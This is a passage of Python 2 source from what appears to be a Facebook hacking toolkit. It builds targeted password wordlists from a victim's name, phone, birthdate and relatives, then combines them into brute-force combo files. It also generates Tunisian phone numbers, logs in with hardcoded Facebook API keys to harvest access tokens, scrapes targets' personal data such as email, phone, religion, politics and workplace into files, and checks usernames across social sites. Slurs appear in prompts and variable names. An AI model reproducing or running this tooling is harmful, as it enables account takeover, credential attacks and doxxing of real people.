           if not suck.isdigit():
            pass
           else:
            s7i7=s7i7+1
          if s7i7==4:
            i=i.replace('\n','')
            fun2.write(str(i)+'\n')
            sock=sock+1
         else:
          if ':' in i:
           i=i.replace('\n','')
           fun3.write(str(i)+'\n')
           nb=nb+1
    print "  %s[%s!%s]%s %s Combos "%(la7mar,la5dhar,la7mar,la5dhar,nb)
    print "  %s[%s!%s]%s %s Proxy "%(la7mar,la5dhar,la7mar,la5dhar,(sock+http))
    print "    %s[%s+%s]%s %s HTTP "%(la7mar,lazra9,la7mar,la5dhar,http)
    print "    %s[%s+%s]%s %s SOCK "%(la7mar,lazra9,la7mar,la5dhar,sock)
    print "%s~~> Saved In 'results/combos/' \033[00m"%(la5dhar)
    raw_input(fy+'Press Enter To Exit..'+fb);exit()
  def email(self):
    nb=0
    li=raw_input("%s[%s+%s] Enter File : %s"%(la7mar,la5dhar,la7mar,lazra9))
    with open(li,'r') as lines:
     lines=lines.read().splitlines()
     fun=open('results/combos/emails(%s).txt'%li,'a')
     for line in lines:
      bomb = line.split(' ')
      for i in bomb:
        if '@' in i:
         i=i.replace('\n','')
         fun.write(str(i)+'\n')
         nb=nb+1
    print "%s Email %s Saved In 'results/combos/emails(%s).txt' \033[00m"%(la5dhar,nb,li)

##
class skykeyz():
  def __init__(self):
    if not os.path.isdir('results/keywords'):
          os.mkdir('results/keywords')

    print """  {re}
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y} {r}({b} 01 {r}){y} Make keywords From self {re}X
  X{y} {r}({b} 02 {r}){y} random keywords         {re}X
  X{y} {r}({b} 69 {r}){y} Back                    {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
 """.format(r=la7mar,b=lazra9,y=lasfar,re=ramadi)
    dream=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
    if dream in ['01','1']:
      self.mello()
    elif dream in ['02','2']:
      self.keyw()
    elif dream =='69':
      heroken()
  def keyw(self):
     print ("""
  1) Social
  2) Gaming""")
     sebsi=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
     if sebsi ==('1'):
       print ("Your results Will Be Saved ")

       for x in social:
        for y in geek3:
         side = x+(' ')+y
         for z in geek4:
          dark = side+(' ')+z
          darkside=open('results/keywords/keycom1.txt','a')
          darkside.write(dark+'\n')

     if sebsi ==('2'):
       print ("Your results Will Be Saved ")

       for x in game:
        for y in geek1:
         side= x+(' ')+y
         for z in geek2:
          dark = side+(' ')+z
          darkside=open('results/keywords/keycom2.txt','a')
          darkside.write(dark+'\n')

  def mello(self):
      fly =raw_input("%s[%s+%s] First Word > %s"%(la7mar,la5dhar,la7mar,lazra9))
      fly1=raw_input("%s[%s+%s] Enter Targets Of Words > %s"%(la7mar,la5dhar,la7mar,lazra9))
      try:
        lovu=open(fly1,'r')
      except:
        print "{!} Error File";exit()
      for z in lovu:
       side = fly+(' ')+z
       dark = side.strip()
       darkside=open('results/keywords/makey.txt','a')
       darkside.write(dark+'\n')
      raw_input(fy+'Press Enter To Exit..'+fb);exit()
####### Clear Terminal/cmd #######
def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')
#
momoChan=['Y','YES','O','OUI','SI','AY','EY','JA','HAY'] #All Yes 's Team 
#######      LogoS        #######
logooo=""" {g} I Wanna Be Hero n° 1{y} Allmighto {r}!!
                  ~~{g}Medoriya Sama{r}~~
 {y} Ultra Smash{r} !{g} 30%
 {y} Ultra Smash{r} !{g} 48%
 {y} Ultra Smash{r} !{g} 53%
 {y} Ultra Smash{r} !{g} 69%
 {y} Ultra Smash{r} !{g} 97%
 {y} Ultra ...{r} 99.9% ! Failed ...{y} P{p}o{b}ww{r}er !!{bl}
""".format(r=la7mar,y=lasfar,g=la5dhar,p=labyadh,b=lazra9,bl=blid),"""
 {r} __   __      _____                 _____ _   _ 
 {r} \ \ / /     /  ___|               /  ___| | | |
 {g}  \ V /______\ `--. _ __ ___   __ _\ `--.| |_| |
 {g}  /   \______|`--. \ '_ ` _ \ / _` |`--. \  _  | 
 {r} / /^\ \     /\__/ / | | | | | (_| /\__/ / | | |
 {r} \/   \/     \____/|_| |_| |_|\__,_\____/\_| |_/""".format(r=la7mar,g=la5dhar),"""
   {g}/{r}$$   {g}/{r}$$        {g} /{r}$$$$$$                          {g}{g} /{r}$$$$$$ {g} /{r}$$  {g} /{r}$$
  {g}| {r}$$ {g} / {r}$$     {g}   /{r}$${g}__  {r}$$                       {g}  /{r}$${g}__  {r}$${g}| {r}$$  {g}| {r}$$
  {g}|  {r}$${g}/ {r}$$/      {g} | {r}$$  {g}\__/ /{r}$$$$$$/{r}$$$$   {g}/{r}$$$$$${g} | {r}$$ {g} \__/| {r}$$ {g} | {r}$$
  {g} \  {r}$$$${g}/ /{r}$$$$$${g}|  {r}$$$$$$ {g}| {r}$$_  {r}$$_  {r}$$ {g}|____  {r}$${g}|  {r}$$$$$${g} | {r}$$$$$$$$
  {g}  >{r}$$  {r}$${g}|______/ \____  {r}$${g}| {r}$${g} \ {r}$${g} \ {r}$$  {g}/{r}$$$$$$$ {g}\____  {r}$${g}| {r}$${g}__  {r}$$
  {g} /{r}$${g}/\  {r}$$  {g}      /{r}$$  {g}\ {r}$${g}| {r}$$ {g}| {r}$$ {g}|{r} $$ {g}/{r}$${g}__  {r}$$ {g}/{r}$$ {g} \ {r}$${g}| {r}$$  {g}| {r}$$
  {g}| {r}$$  \ {r}$$     {g}  |  {r}$$$$$${g}/| {r}$$ {g}| {r}$$ {g}| {r}$${g}|  {r}$$$$$$${g}|  {r}$$$$$${g}/| {r}$$  {g}| {r}$$
  {g}|__/  |__/        \______/ |__/ |__/ |__/ \_______/ \______/ |__/  |__/""".format(r=la7mar,g=la5dhar),"""
  {r}   )       (                  (        )  
  ( /(       )\ )               )\ )  ( /(  
  )\())     (()/(    )       ) (()/(  )\()) 
  ((_)\  {g}___ {r} /(_))  (     ( /(  /(_))((_)\  
  {g}__{r}(({g}_{r}){g}|___|{r}({g}_{r}))    )\  ' )({g}_{r}))({g}_{r}))   {g}_{r}(({g}_{r}) {g}
  \ \/ /     / __| _((_)) ((_)_ / __| | || | 
   >  <      \__ \| '  \()/ _` |\__ \ | __ | 
  /_/\_\     |___/|_|_|_| \__,_||___/ |_||_| 
                                           """.format(r=la7mar,g=la5dhar)
logon="%s\033[93m%s\n   %s%sX%s-%ssmash\033[92mV1\033[91m.\033[92m0%s%s | %s%sPriv8%s \033[93mFBHackBox %s%s|%s%s Th3%sCod3r>%s M4rkW4lk3r%s"%(blid,random.choice(logooo),hell,la5dhar,lazra9,la7mar,saker,lazra9,hell,lasfar,la5dhar,saker,lazra9,hell,la7mar,la5dhar,lasfar,saker)

class xsmash(object):
  ####### Ohayo Sensei ^.^ #######
  def allmight(self):
    print"""%s
    [%s1%s]   Random Numbers
    [%s2%s]   Numbers Ranger
    [%s666%s] Back """%(la5dhar,lazra9,la5dhar,lazra9,la5dhar,lazra9,la5dhar)
    noob=raw_input("%ssmash> %s"%(ramadi,lazra9))
    if noob =='1':
     nb=0
     xtn=int(raw_input("%s[%s/%s] How Mush %s??\n%ssmash> %s"%(la7mar,la5dhar,la7mar,la5dhar,ramadi,lazra9)))
     print"%s[%s/%s] Length %s!%s"%(la7mar,la5dhar,la7mar,la5dhar,la7mar)
     ztn=int(raw_input("%ssmash> %s"%(ramadi,lazra9)))
     try :
      for az in range(xtn) :
        urname = string.digits
        urname1 = ''.join(choice(urname) for _ in range(ztn))
        save = open("xrzlts/passran.txt", 'a')
        save.write(urname1 + '\n')
        nb=nb+1
      print" %s[?] %s Saved In xrzlts/passran.txt !"%(la5dhar,nb+1)
      raw_input(fy+'Press Enter To Exit..'+fb);exit()
     except:
          pass
    elif noob =='2':
      nb=0
      startfrom=raw_input("%s[%s/%s] Start From ! %s[defaut:1]\n%ssmash> %s"%(la7mar,la5dhar,la7mar,la5dhar,ramadi,lazra9))
      if len(str(startfrom))==0:
        startfrom=1
      endto=raw_input("%s[%s/%s] End To %s?\n%ssmash> %s"%(la7mar,la5dhar,la7mar,la5dhar,ramadi,lazra9))
      for ii in range(int(startfrom),int(endto),1):
        zz=open('xrzlts/numpass.txt','a')
        zz.write(str(ii)+'\n')
        nb=nb+1
      print" %s[?] %s Number Saved In xrzlts/numpass.txt !"%(la5dhar,nb+1)
      raw_input(fy+'Press Enter To Exit..'+fb);exit()
    elif noob =='666': 
     self.bokunohero() 
    else:
      exit()
  def medoria(self):
   print """%s
              ______• _¦ ¦ _ ?  .__ · ?   ___· 
              •¦¦  ¦?¦¦¦•¦¦¦¦¦¦ ¦¦ ¯. ¦¦ ¦¦ ¯¦ 
               ¦¦.?¦¦¦¦¦¦¦¦¦¦¦¦·_¯¯¯¦_¦¦·_¦¯¯¦ 
               ¦¦¦·¦¦_¦¦¦¦¦¦¦¦¦¦¦¦_?¦¦¦¦¦¦¦ ?¦¦
               ¯¯¯  ¯¯¯ ¯¯ ¦?¯¯¯ ¯¯¯¯ ¯¯¯ ¯  ¯%s NBranger %sv1 
   """ %(la5dhar,lazra9,lasfar)
   print """%s
        [%s1%s] Orange 
        [%s2%s] Telecom
        [%s3%s] Ooredoo
        [%s666%s] Back
   """%(la7mar,lazra9,la7mar,lazra9,la7mar,lazra9,la7mar,lazra9,la7mar)
   ztn = raw_input("%ssmash> %s"%(ramadi,lazra9))
   if ztn =='1':
    xtn = raw_input("%s[%s/%s] How Much U need ? > %s"%(la7mar,la5dhar,la7mar,lazra9))
    try :
     for az in range(int(xtn)) :
      tn = string.digits
      tn0 = ''.join(choice(tn) for _ in range(7))
      fade= '5'+tn0 
      waw = open("xrzlts/tnorang.txt", 'a')
      waw.write(fade+ '\n')
     print "%s[?] saved in xrzlts/tnorang.txt ! %s"%(la5dhar,labyadh)
     raw_input(fy+'Press Enter To Exit..'+fb);exit()
  
    except : 
         pass
   elif ztn =='2':
    xtn = raw_input("%s[%s/%s] How Much U need ? > %s"%(la7mar,la5dhar,la7mar,lazra9))
    try :
     for az in range(int(xtn)) :
      tn = string.digits
      tn0 = ''.join(choice(tn) for _ in range(7))
      fade= '9'+tn0 
      waw = open("xrzlts/tntt.txt", 'a')
      waw.write(fade+ '\n') 
     print "%s[?] saved in xrzlts/tntt.txt %s"%(la5dhar,labyadh)
     raw_input(fy+'Press Enter To Exit..'+fb);exit()
    except :
         pass
   elif ztn =='3':
    xtn = raw_input("%s[%s/%s] How Much U need ? > %s"%(la7mar,la5dhar,la7mar,lazra9))
    try :
     for az in range(int(xtn)) :
      tn = string.digits
      tn0 = ''.join(choice(tn) for _ in range(7))
      fade='2'+tn0 
      waw = open("xrzlts/tnoored.txt", 'a')
      waw.write(fade+ '\n')
     print" %s[?] saved in xrzlts/tnoored.txt %s"%(la5dhar,labyadh)
     raw_input(fy+'Press Enter To Exit..'+fb);exit()
    except : 
         pass
   elif ztn=='666':
    self.bokunohero()
  def beloumi(self):
   try:
    with open('xrzlts/TNPhones.txt','a') as tounsi:
      if os.path.isfile('xrzlts/tnoored.txt'):
       tn1=open('xrzlts/tnoored.txt','r').read().splitlines()
       for i in tn1:
        tounsi.write(str(i)+'\n')
      if os.path.isfile('xrzlts/tntt.txt','r'):
       tn2=open('xrzlts/tntt.txt').read().splitlines()
       for i in tn2:
        tounsi.write(str(i)+'\n')
      if os.path.isfile('xrzlts/tnorang.txt','r'):
       tn3=open('xrzlts/tnorang.txt').read().splitlines()
       for i in tn3:
        tounsi.write(str(i)+'\n')
   except:
    self.medoria()
  def toro(self):
  ####### Work With Info #######
   hikir=['','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','qwerty','azerty','azerty123','azerty1234','12','123','1234','12345','123456','1234567','12345678','123456789''1234567890','987654321','321','1111','0000','01','0123','01234','012345','0123456','01234567','012345678','0123456789','11','22','33','44','55','66','77','88','99','00']
   snin=['0','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
   ## I like This range okk ^^ 
   print """\n
      {r}<===========================>
      {r}<=>   {g}Valid FBPassMaker   {r}<=>
      {r}<=>       {g}By {re}W4lk3r       {r}<=>
      {r}<===========================>  
   """.format(r=la7mar,g=la5dhar,re=ramadi)
   zack =raw_input("%sEnter UserName > %s"%(la7mar,lazra9))
   while len(zack)==0 or zack[0].isdigit() :
    print "%s[%s!%s] Invalid Name ..Please Try"%(la7mar,la5dhar,la7mar)
    zack =raw_input("%sEnter UserName > %s"%(la7mar,lazra9))
   mayar =raw_input("%sEnter Nickname > %s"%(la7mar,lazra9))
   zack2=raw_input("%sEnter PhoneNum > %s"%(la7mar,lazra9))
   while not zack2.isdigit() or len(zack2)<8:
      print "%s[%s!%s] Incorrect Number ..Please Try"%(la7mar,la5dhar,la7mar)
      zack2=raw_input("%sEnter PhoneNum > %s"%(la7mar,lazra9))
   print "%sHave U The Date ? [Y(Yes)/N(No)]"%la7mar
   gaza=raw_input("%ssmash> %s"%(ramadi,lazra9))
   gaza =gaza.upper()
   if gaza in momoChan:
    daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
    while not daty.isdigit():
      print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
      daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
    while int(daty) not in range(1941,2003) :
     print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
     daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
    datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
    while not datm.isdigit():
      print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
      datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
    while int(datm) not in range(1,12) :
     print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
     datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
    datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
    while not datd.isdigit():
      print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
      datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
    while int(datd) not in range(1,31) :
     print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
     datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
   else:
        pass
   print "%sEnter Name of Gf/Bf/Company/Mother/hobbie/father/sister/..."%la7mar
   zack3=raw_input("%ssmash> %s"%(ramadi,lazra9))
   ille=raw_input(" %s[%s+%s]Do You Need To Add Symboles ? [e.g : !#$^ ]\n%ssmash> %s"%(la7mar,la5dhar,la7mar,ramadi,lazra9))
   ille= ille.upper()
   try:
    for x in hikir:
      side = zack + x
      darkside=open('xrzlts/passwd.txt','a')
      darkside.write(side+'\n')
    for y in hikir:
      side = zack3 + y
      darkside=open('xrzlts/passwd.txt','a')
      darkside.write(side+'\n') 
    for zz in hikir:
      side = zack+'@'+zack+zz +'\n'+'@'+zz+zack+'\n'+zz+'@'+zack+'\n'+zack+zz+mayar+'\n'+zack+mayar+zz+'\n'+zack2+zz
      darkside=open('xrzlts/passwd.txt','a')
      darkside.write(side+'\n')    
    for xx in snin:
      side = zack+xx
      darkside=open('xrzlts/passwd.txt','a')
      darkside.write(side+'\n')
    for zx in hikir :
      side1 = zack+' '+zx
      side2 = zack+' '+zx+mayar
      darkside=open('xrzlts/passwd.txt','a')
      darkside.write(side+'\n')    
   except:
     print '%s? Opps .. !!'%la7mar
     exit()
   dark = zack2+zack
   dark2= zack+zack2+'\n'+zack+mayar+'\n'+mayar+zack2+'\n'+zack+zack+'\n'+zack+zack+zack2+'\n'+zack+'@'+zack+'\n'+zack+'@'+zack2+'\n'+zack+' '+mayar+'\n'+mayar+' '+zack+'\n'+zack3+' '+zack+'\n'+zack+' '+zack2+'\n'+zack2+' '+zack
   if gaza in ['Y','YES','SI','OUI','EY','AY']:
    daty1=daty[2:]
    dark3= zack+daty+datm+datd+'\n'+zack+daty+datm+'\n'+zack+daty1+'\n'+zack+daty+'\n'+mayar+daty1+'\n'+zack+'@'+daty+'\n'+zack+'@'+daty1+zack+'\n'+zack+daty+mayar+'\n'+zack+mayar+daty+'\n'+zack+zack+daty+'\n'+zack+daty1+mayar+'\n'+zack+mayar+daty1+'\n'+zack+zack+daty1
    dark6= dark+('\n')+dark2+('\n')+dark3+('\n')
    darkside=open('xrzlts/passwd.txt','a')
    darkside.write(dark6+'\n')
   else :
    darkside=open('xrzlts/passwd.txt','a')
    darkside.write(zack2+'\n')
   if ille in momoChan:
    for xy in range(500):
      side2 = '!@#$%^&*()_+<>.'
      side1 = ''.join(choice(side2) for _ in range(3))
      side3 = ''.join(choice(side2) for _ in range(2))
      side4 = ''.join(choice(side2) for _ in range(4))
      side  = zack+side1+'\n'+zack+side3+'\n'+zack+side4
      darkside=open('xrzlts/passwd.txt','a')
      darkside.write(side+'\n')
   else:
      pass
   lines = 0
   with open('xrzlts/passwd.txt','r') as jogan:
      for line in jogan:
          lines += 1
   lines += 1
   darkside.close()
   print"%s[?] Ur Results Saved In xrzlts/passwd.txt ! [ %s%s%s Passwords ]"%(la5dhar,lazra9,lines,la5dhar)
   nigga = raw_input("%sBrute Or Return To Menu Or quit [B/r/q]\n %ssmash> %s"%(la7mar,ramadi,lazra9)).upper()
   if nigga =='B':
    ### Make User's ID in text ###
    darkweb=raw_input('ID : ')
    deepweb=open('xrzlts/user.txt','w')
    deepweb.write(darkweb)
    ### Make A combo ###
    zack = open('xrzlts/user.txt','r').read().splitlines()
    zack2 = open('xrzlts/passwd.txt','r').read().splitlines()
    for z in zack:
     for y in zack2:
      zz  = z+(':')+y
      zz0=open('xrzlts/combo.txt','a')
      zz0.write(mark+'\n')
    ### Back To Hack xD ###
    print "Back To Menu And Put number 5 Or 6 "
    raw_input('<x>Press Enter Or Any Key To Go<x>')
    clear()
    self.bokunohero()
   elif nigga =='R':
    self.bokunohero()
   else:
    exit()
  def uraraka(self):
    tebassa = string.ascii_letters + string.digits + '!@#$%^&*()_<>'
    tebayo  = ''.join(choice(tebassa) for n in range(10)) #change 10 for any number xD
    print "%s[%s+%s] Secure Password : %s%s"%(la7mar,la5dhar,la7mar,lazra9,tebayo)
    rakez()
  ####### Sauce : OSIF TOOL (Thnx DuDe) #######
  def get(self):
     global a ,token,name
     os.system('clear')
     try:
      print '%s[%s?%s] Sucess !! Your Token : %s%s'%(la7mar,la5dhar,la7mar,lazra9,token)
      tarrr=raw_input("%s[%s+%s] ID Of Your Nigga > %s"%(la7mar,la5dhar,la7mar,lazra9))
      if not tarrr.isdigit() == 1:
       url = 'https://www.facebook.com/%s'%tarrr
       lol1 = re.compile('"entity_id":"([0-9]+)"')
       page = requests.get(url)
       target1=str(lol1.findall(page.content))
       rr = "%s"%target1 #idk watis :/
       rr = rr.replace("['","")
       target = rr.replace("']","")
      else:
        target =tarrr
      try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
        a = json.loads(r.text)
      except:
        print '%s ? Something Wrong !!'%(la7mar)
      self.info(target)
     except KeyError:
      print '%s ? Something Wrong !!'%(la7mar)
      self.lvl69()
     except requests.exceptions.ConnectionError:
      print '%s ? Something Wrong !!'%(la7mar)
      self.lvl69()
  def lvl69(self):
    global a ,token,name
    try:
      token = open('xrzlts/toka.log','r').read().splitlines()
      token=token[0]
    except:
      self.lvlgod()
    r = requests.get('https://graph.facebook.com/me?access_token=%s'%token)
    a = json.loads(r.text)
    name = str(a['name'])
    badel=raw_input("%sDo You Want To Continue With %s%s (Y/n)??%s"%(la5dhar,lazra9,name,la5dhar))
    if badel.upper() in momoChan:
      self.get()
    else:
      self.lvlgod()
    
  
  def lvlgod(self):
    global token,name
    print '%s%s [%s ?? Please Log With Your Account ?? %s]%s'%(blid,lasfar,la5dhar,lasfar,la7mar);id = raw_input(' ?? Email/username > %s'%lazra9);pwd = raw_input('%s ??  Password > %s'%(la7mar,lazra9));API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
    x = hashlib.new('md5')
    x.update(sig)
  
    data.update({'sig':x.hexdigest()})
    b = open('xrzlts/toka.log','w')
    r = requests.get('https://api.facebook.com/restserver.php',params=data)
    a = json.loads(r.text)
    try:
      b.write(a['access_token'])
    except:
      print '%s ? Something Wrong !!'%(la7mar)
      print "Check Your Login Or Network Bro "
    b.close()
    token =str(a['access_token'])
    r = requests.get('https://graph.facebook.com/me?access_token=%s'%token)
    a = json.loads(r.text)
    name = str(a['name'])
    self.get()
  
  def info(self,target):
    global a , token
          
    for i in a['data']:
  
     if target in  i['name'] or target in i['id']:
  
      x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
      y = json.loads(x.text)
  
  
      print '     %s??%s %sPrices Of Pizza%s %s??%s'%(lasfar,la5dhar,bigas,bigbbs,lasfar,lazra9)
  
      try:
        print '%s[%s+%s] Id : %s'%(la7mar,la5dhar,la7mar,i['id'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Username : %s'%(la7mar,la5dhar,la7mar,y['username'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Email : %s'%(la7mar,la5dhar,la7mar,y['email'])
        zoo=open('xrzlts/%s_xemail.txt'%name,'a')
        zoo.write(y['email']+'\n')
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Mobile Phone : %s'%(la7mar,la5dhar,la7mar,y['mobile_phone'])
        zoo=open('xrzlts/%s_xphone.txt'%name,'a')
        zoo.write(y['mobile_phone']+'\n')
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Name : %s'%(la7mar,la5dhar,la7mar,y['name'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] First name : %s'%(la7mar,la5dhar,la7mar,y['first_name'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Midle name : %s'%(la7mar,la5dhar,la7mar,y['middle_name'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Last name : %s'%(la7mar,la5dhar,la7mar,y['last_name'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Locale : %s'%(la7mar,la5dhar,la7mar,y['locale'].split('_')[0])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] location : %s'%(la7mar,la5dhar,la7mar,y['location']['name'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] hometown : %s'%(la7mar,la5dhar,la7mar,y['hometown']['name'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] gender : %s'%(la7mar,la5dhar,la7mar,y['gender'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] religion : %s'%(la7mar,la5dhar,la7mar,y['religion'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] relationship status : %s'%(la7mar,la5dhar,la7mar,y['relationship_status'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] political : %s'%(la7mar,la5dhar,la7mar,y['political'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Work :'%(la7mar,la5dhar,la7mar)
  
        for i in y['work']:
          try:
            print '   %s[%s/%s] position : %s'%(la7mar,lasfar,la7mar,i['position']['name'])
          except KeyError:
            pass
          try:
            print '   %s[%s/%s] employer : %s'%(la7mar,la5dhar,la7mar,i['employer']['name'])
          except KeyError:
            pass
          try:
            if i['start_date'] == "0000-00":
              print '   %s[%s/%s] start date : ---'%(la7mar,la5dhar,la7mar)
            else:
              print '   %s[%s/%s] start date : %s'%(la7mar,la5dhar,la7mar,i['start_date'])
          except KeyError:
            pass
          try:
            if i['end_date'] == "0000-00":
              print '   %s[%s/%s] end date : ---'%(la7mar,la5dhar,la7mar)
            else:
              print '   %s[%s/%s] end date : %s'%(la7mar,la5dhar,la7mar,i['end_date'])
          except KeyError:
            pass
          try:
            print '   %s[%s+%s] location : %s'%(la7mar,la5dhar,la7mar,i['location']['name'])
          except KeyError:
            pass
          print ' '
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Updated time : %s'%(la7mar,la5dhar,la7mar,y['updated_time'][:10]+' '+y['updated_time'][11:19])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Languages : '%(la7mar,la5dhar,la7mar)
        for i in y['languages']:
          try:
            print '%s ~  %s'%(la7mar,i['name'])
          except KeyError:
            pass
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Bio : %s'%(la7mar,la5dhar,la7mar,y['bio'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] quotes : %s'%(la7mar,la5dhar,la7mar,y['quotes'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] birthday : %s'%(la7mar,la5dhar,la7mar,y['birthday'].replace('/','-'))
      except KeyError:
        pass
      try:
        print '%s[%s+%s] link : %s'%(la7mar,la5dhar,la7mar,y['link'])
      except KeyError:
        pass
      try:
        print '%s[%s+%s] Favourite teams : '%(la7mar,la5dhar,la7mar)
        for i in y['favorite_teams']:
          try:
            print ' %s~  %s'%(la7mar,i['name'])
          except KeyError:
            pass
      except KeyError:
        pass
      try:
        print '%s[%s+%s] School : '%(la7mar,la5dhar,la7mar)
        for i in y['education']:
          try:
            print ' %s~  %s'%(la7mar,i['school']['name'])
          except KeyError:
            pass
      except KeyError:
        pass
     else:
      pass
    print "%s[%s?%s] Thnx For Watching Nsibti La3ziza xD%s"%(la7mar,la5dhar,la7mar,lazra9)
    raw_input("press any key to Back To Menu ...")
    clear()
    self.bokunohero()
  ####################
  def bokunohero(self):
  ####### logo ####### 
   print logon
  ####### Menu #######
   print """ 
{r}<{y}------------------------------------------------------{r}>
{r}[{y}!{r}]{y}  Im Not Responsible For Any activity From This Tool 
{r}[{g}0{r}]{y}  Get Info From Facebook(Graph.Fb)
{r}[{g}1{r}]{y}  Passwords With Info 
{r}[{g}2{r}]{y}  Passwords With Numbers
{r}[{g}3{r}]{y}  Passwords With NumberPhone(Only Tunisia) 
{r}[{g}4{r}]{y}  Get Some Passlists
{r}[{g}5{r}]{y}  Wanna Secure Password
{r}[{g}ctrl-c{r}]{y} Exit 
{r}<{y}------------------------------------------------------{r}>""".format(r=la7mar,g=la5dhar,b=lazra9,y=lasfar)
  
   zack=raw_input("  %ssmash> %s"%(ramadi,lazra9))
   clear()
   print logon+'\n'
   if zack =='1':
    self.toro()
   elif zack=='0':
    self.lvl69()
   elif zack =='2':
    self.allmight()
   elif zack =='3':
    self.medoria()
   elif zack =='4':
    os.system('echo GoogleIt ... Bakka -_- ') 
   elif zack =='6':
    self.uraraka()
   else:
    pass
  def __init__(self):
   '''
     (C)opyright > Github.com/M4rktn
   '''
   try:
      clear()
      if not os.path.isdir('xrzlts'):
        os.mkdir('xrzlts')
      else:
        pass
      self.bokunohero()
   except KeyboardInterrupt:
      pass
##
class allforone(object):
  def __init__(self):
    os.system('clear')
    if not os.path.isdir('results/SChcked'):
      os.mkdir('results/SChcked')
    else:
      pass
    self.logo()
    try:
     ignite=raw_input("%s[%s+%s] Enter list : %s"%(la7mar,la5dhar,la7mar,lazra9))
    except KeyboardInterrupt:
      heroken()
    try:
      self.oneforall(ignite)
    except KeyboardInterrupt:
      heroken()
  def fight(self, x,user):
    print "  %s[%s+%s]%s %s Founded !! "%(la7mar,lazra9,la7mar,la5dhar,x)
    with open('results/SChcked/SocialLinks.txt','a') as yoo:
      yoo.write("%s ~~> Found\n"%(x))
  def peace(self, user):
    print "  %s[%s!%s]%s %s not In Any SM "%(lazra9,la7mar,lazra9,la5dhar,str(user))
  def oneforall(self,ignite):
    with open(ignite,'r') as dark:
     try:
        arigato=dark.read().splitlines()
     except:
        print "{!} Error File";exit()
     x=open('results/SChcked/SocialLinks.txt','a')
     for user in arigato:
      if ':' in str(user) or '@' in str(user):
        pass
      Bg=0
      x.write("User : %s\n"%(user))
      print "%s[%s?%s]%s %s ... "%(la7mar,lazra9,la7mar,la5dhar,str(user))
      try:
         instagrom = requests.get('https://instagram.com/' + str(user), timeout=5)
         if instagrom.status_code == 200:
          self.fight('Instagram',user)
          Bg=1
      except:
          pass
      try:
         telegrom  = requests.get('https://t.me/' + str(user), timeout=5)
         if 'tgme_username_link' not in telegrom.text:
          self.fight('Telegram',user)
          Bg=1
      except:
          pass
      try:
         faceomek  = requests.get('https://facebook.com/' + str(user), timeout=5)
         if faceomek.status_code == 200:
            self.fight('Facebook',user)
            Bg=1
      except:
          pass
      try:
         youtayb   = requests.get('https://youtube.com/c/' + str(user), timeout=5)
         if youtayb.status_code == 200:
          self.fight('YoutubeChannel',user)
          Bg=1
      except:
          pass
      try:
